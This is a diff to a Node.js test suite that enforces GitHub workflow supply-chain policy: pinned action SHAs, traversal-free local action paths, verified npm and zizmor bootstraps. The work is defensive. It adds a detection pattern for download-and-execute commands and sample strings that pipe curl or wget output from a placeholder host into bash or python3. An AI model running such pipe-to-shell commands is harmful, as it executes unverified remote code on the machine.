@@ -4,6 +4,9 @@ import { join } from 'node:path';
 import { test } from 'node:test';
 
 const workflows = join(process.cwd(), '.github', 'workflows');
+const LOCAL_ACTION_REF = /^\.\/\.github\/actions\/[A-Za-z0-9_-]+(?:\/[A-Za-z0-9_-]+)*$/;
+const EXTERNAL_ACTION_REF = /^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+(?:\/[A-Za-z0-9_.-]+)*@[0-9a-f]{40}$/;
+const DIRECT_DOWNLOADED_EXECUTION = /(?:curl|wget)[^\n|]*\|\s*(?:bash|sh|zsh|dash|python(?:3)?|perl|ruby)\b|(?:bash|sh|zsh|dash|python(?:3)?|perl|ruby)\s+<\(\s*(?:curl|wget)\b|(?:eval|bash\s+-c|sh\s+-c)\s+["']?\$\(\s*(?:curl|wget)\b/i;
 
 test('workflow local actions use valid relative paths to existing action metadata', () => {
   let checked = 0;
@@ -11,7 +14,7 @@ test('workflow local actions use valid relative paths to existing action metadat
     const content = readFileSync(join(workflows, file), 'utf8');
     for (const [, target] of content.matchAll(/^\s*-\s*uses:\s*([^\s#]+)/gm)) {
       if (!target.includes('/.github/actions/')) continue;
-      assert.match(target, /^\.\/\.github\/actions\/[\w./-]+$/, `${file}: invalid local action path ${target}`);
+      assert.match(target, LOCAL_ACTION_REF, `${file}: invalid local action path ${target}`);
       assert.ok(
         existsSync(join(process.cwd(), target, 'action.yml')) ||
           existsSync(join(process.cwd(), target, 'action.yaml')),
@@ -25,18 +28,23 @@ test('workflow local actions use valid relative paths to existing action metadat
 
 
 test("third-party workflow actions are pinned to full 40-character commit SHAs", () => {
-  const externalAction = /^([A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+)@(.+)$/;
   for (const file of readdirSync(workflows).filter((name) => /\.ya?ml$/.test(name))) {
     const content = readFileSync(join(workflows, file), "utf8");
     for (const [, target] of content.matchAll(/^\s*-\s*uses:\s*([^\s#]+)/gm)) {
       if (target.startsWith("./")) continue;
-      const match = externalAction.exec(target);
-      if (!match) continue;
-      assert.match(match[2], /^[0-9a-f]{40}$/, `${file}: external action is not pinned to a full commit SHA: ${target}`);
+      assert.match(target, EXTERNAL_ACTION_REF, `${file}: invalid or unpinned external action: ${target}`);
     }
   }
 });
 
+test("action-reference policy rejects traversal and malformed external targets", () => {
+  assert.doesNotMatch('./.github/actions/../secret', LOCAL_ACTION_REF);
+  assert.doesNotMatch('./.github/actions/npm-ci-retry/../../secret', LOCAL_ACTION_REF);
+  assert.match(`github/codeql-action/analyze@${'a'.repeat(40)}`, EXTERNAL_ACTION_REF);
+  for (const bad of ['actions/checkout@v4', 'actions/checkout', 'owner/repo/path@main', 'docker://alpine:latest']) {
+    assert.doesNotMatch(bad, EXTERNAL_ACTION_REF);
+  }
+});
 
 test("raw GitHub workflow downloads use immutable 40-character commit refs", () => {
   const rawGithub = /https:\/\/raw\.githubusercontent\.com\/[^/\s]+\/[^/\s]+\/([^/\s"']+)\//g;
@@ -52,14 +60,23 @@ test("raw GitHub workflow downloads use immutable 40-character commit refs", () 
 test("workflows do not execute downloaded shell scripts directly", () => {
   for (const file of readdirSync(workflows).filter((name) => /\.ya?ml$/.test(name))) {
     const content = readFileSync(join(workflows, file), "utf8");
-    assert.doesNotMatch(content, /bash\s+<\(curl\b/, `${file}: downloaded shell script is executed directly`);
+    assert.doesNotMatch(content, DIRECT_DOWNLOADED_EXECUTION, `${file}: downloaded content is executed directly`);
+  }
+  for (const bad of [
+    'curl -fsSL https://example.invalid/x | bash',
+    'wget -qO- https://example.invalid/x | python3',
+    'bash <(curl -fsSL https://example.invalid/x)',
+    'eval "$(curl -fsSL https://example.invalid/x)"',
+  ]) {
+    assert.match(bad, DIRECT_DOWNLOADED_EXECUTION);
   }
 });
-
 
 test("quickstart does not stream downloaded response bytes into an interpreter", () => {
   const quickstart = readFileSync(join(process.cwd(), "examples", "quickstart", "curl_terminal.sh"), "utf8");
   assert.doesNotMatch(quickstart, /curl[\s\S]*?\|\s*python3\b/, "quickstart must separate HTTP response retrieval from local parsing");
+  assert.doesNotMatch(quickstart, /sys\.argv\[1\]/, "quickstart must not pass unbounded response bytes through argv");
+  assert.match(quickstart, /json\.load\(sys\.stdin\)/, "quickstart must parse the buffered response from stdin");
 });
 
 test('zizmor is installed from a checksum-verified exact release asset, not pip', () => {
@@ -93,6 +110,9 @@ test('authoritative npm CI bootstrap verifies an exact source tarball plus locke
   assert.match(source.integrity, /^sha512-/);
   assert.match(helper, /npm ci --prefix "\$overlay_dir"/);
   assert.match(helper, /bootstrap-authoritative-npm\.mjs/);
+  assert.match(helper, /npm-source\.json/);
+  assert.match(helper, /source_version/);
+  assert.doesNotMatch(helper, /test "\$\(npm --version\)" = "12\.0\.2"/);
   assert.equal(overlayLock.lockfileVersion, 3);
   assert.equal(existsSync(join(process.cwd(), '.github', 'toolchains', 'npm', 'package-lock.json')), false);
   assert.doesNotMatch(helper, /npm install\s+-g\s+npm@/);
@@ -100,10 +120,12 @@ test('authoritative npm CI bootstrap verifies an exact source tarball plus locke
     '.github/workflows/build.yml',
     '.github/workflows/ci.yml',
     '.github/workflows/release-platforms.yml',
+    '.github/workflows/release-acceptance.yml',
     '.github/workflows/self-hosted-arm64.yml',
     '.github/actions/npm-ci-retry/action.yml',
   ]) {
     const content = readFileSync(join(process.cwd(), workflowPath), 'utf8');
+    assert.match(content, /bootstrap-authoritative-npm\.sh|uses:\s*\.\/\.github\/actions\/npm-ci-retry/, `${workflowPath}: npm execution must use the authoritative bootstrap`);
     assert.doesNotMatch(content, /npm install\s+-g\s+npm@12\.0\.2/);
   }
 });
